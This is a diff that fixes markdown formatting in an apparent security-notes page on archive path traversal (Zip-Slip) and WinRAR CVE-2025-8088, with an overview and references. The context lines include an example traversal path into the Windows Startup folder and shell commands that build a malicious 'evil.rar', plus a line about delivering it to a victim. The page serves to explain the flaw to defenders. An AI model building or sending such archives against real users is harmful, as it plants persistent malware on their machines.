@@ -1,6 +1,5 @@
 # Archive Extraction Path Traversal ("Zip-Slip" / WinRAR CVE-2025-8088)
 
-
 ## Overview
 
 Many archive formats (ZIP, RAR, TAR, 7-ZIP, etc.) allow each entry to carry its own **internal path**. When an extraction utility blindly honours that path, a crafted filename containing `..` or an **absolute path** (e.g. `C:\Windows\System32\`) will be written outside of the user-chosen directory.  
@@ -24,7 +23,7 @@ A malicious RAR archive containing an entry such as:
 ```text
 ..\..\..\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe
 ```
-```
+
 would end up **outside** the selected output directory and inside the user’s *Startup* folder. After logon Windows automatically executes everything present there, providing *persistent* RCE.
 
 ### Crafting a PoC Archive (Linux/Mac)
@@ -35,7 +34,7 @@ mkdir -p "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Men
 cp payload.exe "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
 rar a -ep evil.rar evil/*
 ```
-```Options used:
+Options used:
 * `-ep`  – store file paths exactly as given (do **not** prune leading `./`).
 
 Deliver `evil.rar` to the victim and instruct them to extract it with a vulnerable WinRAR build.
@@ -65,7 +64,7 @@ ESET reported RomCom (Storm-0978/UNC2596) spear-phishing campaigns that attached
 
 ## References
 
-- [[https://www.bleepingcomputer.com/news/security/winrar-zero-day-flaw-exploited-by-romcom-hackers-in-phishing-attacks/|BleepingComputer – WinRAR zero-day exploited to plant malware on archive extraction]]
-- [[https://www.win-rar.com/singlenewsview.html?&L=0&tx_ttnews%5Btt_news%5D=283&cHash=a64b4a8f662d3639dec8d65f47bc93c5|WinRAR 7.13 Changelog]]
-- [[https://snyk.io/research/zip-slip-vulnerability|Snyk – Zip Slip vulnerability write-up]]
+- [BleepingComputer – WinRAR zero-day exploited to plant malware on archive extraction](https://www.bleepingcomputer.com/news/security/winrar-zero-day-flaw-exploited-by-romcom-hackers-in-phishing-attacks/)
+- [WinRAR 7.13 Changelog](https://www.win-rar.com/singlenewsview.html?&L=0&tx_ttnews%5Btt_news%5D=283&cHash=a64b4a8f662d3639dec8d65f47bc93c5)
+- [Snyk – Zip Slip vulnerability write-up](https://snyk.io/research/zip-slip-vulnerability)
 
